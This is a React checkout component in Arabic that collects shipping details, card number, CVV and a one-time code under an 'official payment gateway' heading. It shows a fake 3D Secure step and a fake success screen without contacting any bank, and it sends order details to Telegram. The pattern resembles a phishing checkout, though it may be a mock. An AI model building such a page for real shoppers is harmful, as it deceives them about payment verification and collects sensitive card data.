
import React, { useState, useEffect } from 'react';
import { Product, ShippingInfo, UserProfile } from '../types';
import { NotificationService } from '../services/notificationService';

interface CheckoutViewProps {
  product: Product;
  onCancel: () => void;
  user: UserProfile | null;
}

type CheckoutStep = 'shipping' | 'payment-method' | 'process-card' | 'process-crypto' | 'process-kuraimi' | 'processing' | 'otp-verify' | 'success';

const CheckoutView: React.FC<CheckoutViewProps> = ({ product, onCancel, user }) => {
  const [step, setStep] = useState<CheckoutStep>('shipping');
  const [shipping, setShipping] = useState<ShippingInfo>({ 
    fullName: user?.name || '', 
    phone: '', 
    city: 'صنعاء', 
    address: '' 
  });
  const [card, setCard] = useState({ number: '', expiry: '', cvv: '', name: user?.name?.toUpperCase() || '' });
  const [cardError, setCardError] = useState('');
  const [otp, setOtp] = useState('');
  const [cardType, setCardType] = useState<'visa' | 'mastercard' | 'unknown'>('unknown');

  useEffect(() => {
    window.scrollTo(0, 0);
  }, [step]);

  const luhnCheck = (num: string) => {
    const arr = (num + '').split('').reverse().map(x => parseInt(x));
    const lastDigit = arr.shift();
    let sum = arr.reduce((acc, val, i) => (i % 2 !== 0 ? acc + val : acc + ((val *= 2) > 9 ? val - 9 : val)), 0);
    sum += lastDigit!;
    return sum % 10 === 0;
  };

  const detectCardType = (num: string) => {
    if (num.startsWith('4')) setCardType('visa');
    else if (num.startsWith('5')) setCardType('mastercard');
    else setCardType('unknown');
  };

  const handleNextStep = (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    if (step === 'shipping') setStep('payment-method');
    else if (step === 'process-card') {
      const cleanNum = card.number.replace(/\s+/g, '');
      if (cleanNum.length < 16 || !luhnCheck(cleanNum)) {
        setCardError('خطأ: رقم البطاقة غير متوافق مع خوارزمية البنك المصدر.');
        return;
      }
      setCardError('');
      setStep('processing');
      setTimeout(() => setStep('otp-verify'), 2500);
    } else if (step === 'otp-verify' || step === 'process-crypto' || step === 'process-kuraimi') {
      if (step === 'otp-verify' && otp.length < 4) return;
      
      // إرسال إشعار تيليجرام عند النجاح
      let method = "بطاقة بنكية";
      if (step === 'process-crypto') method = "بينانس / USDT";
      if (step === 'process-kuraimi') method = "بنك الكريمي";

      NotificationService.sendTelegramNotification(
        NotificationService.formatOrderMessage({
          product: product.name,
          price: `${product.price} ر.س`,
          method: method,
          customer: shipping
        })
      );

      setStep('processing');
      setTimeout(() => setStep('success'), 2000);
    } else {
      setStep('processing');
      setTimeout(() => setStep('success'), 3000);
    }
  };

  const renderShipping = () => (
    <div className="max-w-2xl mx-auto animate-fade-in px-4">
      <div className="bg-white p-8 md:p-14 rounded-[3rem] shadow-2xl border border-emerald-50">
        <h2 className="text-3xl font-black text-emerald-950 mb-4">بيانات التوصيل الرسمية</h2>
        <form onSubmit={handleNextStep} className="space-y-6">
          <input type="text" required value={shipping.fullName} onChange={e => setShipping({...shipping, fullName: e.target.value})} placeholder="الاسم الرباعي الكامل" className="w-full bg-emerald-50/50 border border-emerald-100 p-5 rounded-2xl outline-none focus:border-emerald-500 font-bold" />
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            <input type="tel" required value={shipping.phone} onChange={e => setShipping({...shipping, phone: e.target.value})} placeholder="رقم هاتف التواصل 7XXXXXXXX" className="w-full bg-emerald-50/50 border border-emerald-100 p-5 rounded-2xl outline-none focus:border-emerald-500 font-bold" />
            <select value={shipping.city} onChange={e => setShipping({...shipping, city: e.target.value})} className="w-full bg-emerald-50/50 border border-emerald-100 p-5 rounded-2xl outline-none focus:border-emerald-500 font-black">
              <option>صنعاء</option><option>تعز</option><option>عدن</option><option>إب</option>
            </select>
          </div>
          <textarea required value={shipping.address} onChange={e => setShipping({...shipping, address: e.target.value})} placeholder="العنوان السكني التفصيلي..." className="w-full bg-emerald-50/50 border border-emerald-100 p-5 rounded-2xl outline-none focus:border-emerald-500 font-bold min-h-[120px]" />
          <button type="submit" className="w-full bg-emerald-600 text-white py-6 rounded-[2rem] font-black shadow-xl hover:bg-emerald-700 transition-all text-xl mt-8">المتابعة لعملية الدفع الآمن</button>
        </form>
      </div>
    </div>
  );

  const renderCardPayment = () => (
    <div className="max-w-xl mx-auto animate-fade-in px-4">
      <div className="bg-white p-8 md:p-12 rounded-[3rem] shadow-2xl border border-emerald-50">
        <form onSubmit={handleNextStep} className="space-y-6">
          {cardError && <div className="p-5 bg-red-50 text-red-600 rounded-2xl text-xs font-black text-center border border-red-100">{cardError}</div>}
          <input type="text" required maxLength={19} value={card.number} onChange={e => {
            const val = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
            detectCardType(val);
            const parts = val.match(/.{1,4}/g) || [];
            setCard({...card, number: parts.join(' ')});
          }} placeholder="0000 0000 0000 0000" className="w-full bg-gray-50 border border-gray-200 p-5 rounded-2xl outline-none focus:border-indigo-500 font-mono text-xl text-center" />
          <input type="text" required value={card.name} onChange={e => setCard({...card, name: e.target.value.toUpperCase()})} placeholder="NAME AS PRINTED" className="w-full bg-gray-50 border border-gray-200 p-5 rounded-2xl outline-none focus:border-indigo-500 font-black uppercase text-center" />
          <div className="grid grid-cols-2 gap-6">
            <input type="text" required placeholder="MM/YY" value={card.expiry} onChange={e => setCard({...card, expiry: e.target.value})} className="w-full bg-gray-50 border border-gray-200 p-5 rounded-2xl outline-none font-black text-center" />
            <input type="password" required maxLength={3} value={card.cvv} onChange={e => setCard({...card, cvv: e.target.value})} placeholder="CVV" className="w-full bg-gray-50 border border-gray-200 p-5 rounded-2xl outline-none font-black text-center" />
          </div>
          <button type="submit" className="w-full bg-indigo-600 text-white py-6 rounded-[2rem] font-black shadow-2xl hover:bg-indigo-700 transition-all text-xl">إرسال طلب التحقق البنكي</button>
        </form>
      </div>
    </div>
  );

  // Added missing renderOtpVerify function to fix the error.
  const renderOtpVerify = () => (
    <div className="max-w-xl mx-auto animate-fade-in px-4">
      <div className="bg-white p-8 md:p-12 rounded-[3rem] shadow-2xl border border-emerald-50 text-center">
        <div className="w-20 h-20 bg-indigo-50 text-indigo-600 rounded-2xl flex items-center justify-center mx-auto mb-8">
          <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
        </div>
        <h2 className="text-2xl font-black text-emerald-950 mb-4">التحقق من الهوية (3D Secure)</h2>
        <p className="text-gray-500 font-bold mb-8">تم إرسال رمز التحقق (OTP) إلى رقم هاتفك المسجل لدى البنك.</p>
        <form onSubmit={handleNextStep} className="space-y-6">
          <input 
            type="text" 
            required 
            maxLength={6} 
            value={otp} 
            onChange={e => setOtp(e.target.value.replace(/[^0-9]/g, ''))} 
            placeholder="0 0 0 0 0 0" 
            className="w-full bg-gray-50 border border-gray-200 p-5 rounded-2xl outline-none focus:border-emerald-500 font-mono text-3xl text-center tracking-[0.5em]" 
          />
          <button type="submit" className="w-full bg-emerald-600 text-white py-6 rounded-[2rem] font-black shadow-xl hover:bg-emerald-700 transition-all text-xl">تأكيد الرمز وإتمام الدفع</button>
        </form>
        <button type="button" className="mt-6 text-emerald-600 font-bold hover:underline text-sm">إعادة إرسال الرمز</button>
      </div>
    </div>
  );

  const renderProcessing = () => (
    <div className="max-w-xl mx-auto py-32 text-center space-y-12 animate-fade-in">
       <div className="relative w-36 h-36 mx-auto">
          <div className="absolute inset-0 border-[10px] border-emerald-100 rounded-full" /><div className="absolute inset-0 border-[10px] border-emerald-600 border-t-transparent rounded-full animate-spin" />
       </div>
       <h2 className="text-4xl font-black text-emerald-950">معالجة المعاملة...</h2>
    </div>
  );

  const renderSuccess = () => (
    <div className="max-w-2xl mx-auto py-20 animate-fade-in text-center px-4">
       <div className="bg-white p-10 md:p-20 rounded-[4rem] shadow-3xl border border-emerald-50 space-y-10">
          <div className="w-28 h-28 bg-emerald-600 text-white rounded-full flex items-center justify-center mx-auto shadow-2xl ring-[20px] ring-emerald-50"><svg width="60" height="60" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="4"><polyline points="20 6 9 17 4 12"/></svg></div>
          <h2 className="text-4xl md:text-5xl font-black text-emerald-950">اكتملت العملية!</h2>
          <p className="text-gray-500 font-bold text-lg">تم استلام طلبك وهو الآن قيد التجهيز.</p>
          <button onClick={onCancel} className="w-full bg-emerald-950 text-white py-6 rounded-[2rem] font-black shadow-xl">العودة للرئيسية</button>
       </div>
    </div>
  );

  return (
    <div className="min-h-[80vh] py-10 bg-emerald-50/20">
      <div className="container mx-auto px-6">
        <div className="flex items-center justify-between mb-16">
           <button onClick={onCancel} className="p-4 bg-white rounded-2xl border border-emerald-50 shadow-sm"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3"><path d="M19 12H5"/><path d="m12 19-7-7 7-7"/></svg></button>
           <h1 className="text-3xl font-black text-emerald-950">بوابة الدفع الرسمية</h1>
        </div>

        <div className="animate-slide-up">
          {step === 'shipping' && renderShipping()}
          {step === 'payment-method' && (
             <div className="max-w-4xl mx-auto grid grid-cols-1 md:grid-cols-2 gap-8">
                <button onClick={() => setStep('process-card')} className="bg-white p-10 rounded-[3rem] border-2 border-transparent hover:border-emerald-500 shadow-xl transition-all flex flex-col items-center gap-6">
                  <span className="w-24 h-24 bg-blue-600 rounded-[2rem] flex items-center justify-center text-5xl">💳</span>
                  <h3 className="text-2xl font-black text-emerald-950">بطاقة بنكية</h3>
                </button>
                <button onClick={() => { setStep('process-crypto'); handleNextStep(); }} className="bg-white p-10 rounded-[3rem] border-2 border-transparent hover:border-emerald-500 shadow-xl transition-all flex flex-col items-center gap-6">
                  <span className="w-24 h-24 bg-yellow-500 rounded-[2rem] flex items-center justify-center text-5xl">₿</span>
                  <h3 className="text-2xl font-black text-emerald-950">بينانس / USDT</h3>
                </button>
                <button onClick={() => { setStep('process-kuraimi'); handleNextStep(); }} className="bg-white p-10 rounded-[3rem] border-2 border-transparent hover:border-emerald-500 shadow-xl transition-all flex flex-col items-center gap-6">
                  <span className="w-24 h-24 bg-emerald-700 rounded-[2rem] flex items-center justify-center text-5xl">🏦</span>
                  <h3 className="text-2xl font-black text-emerald-950">بنك الكريمي</h3>
                </button>
             </div>
          )}
          {step === 'process-card' && renderCardPayment()}
          {step === 'otp-verify' && renderOtpVerify()}
          {step === 'processing' && renderProcessing()}
          {step === 'success' && renderSuccess()}
        </div>
      </div>
    </div>
  );
};

export default CheckoutView;
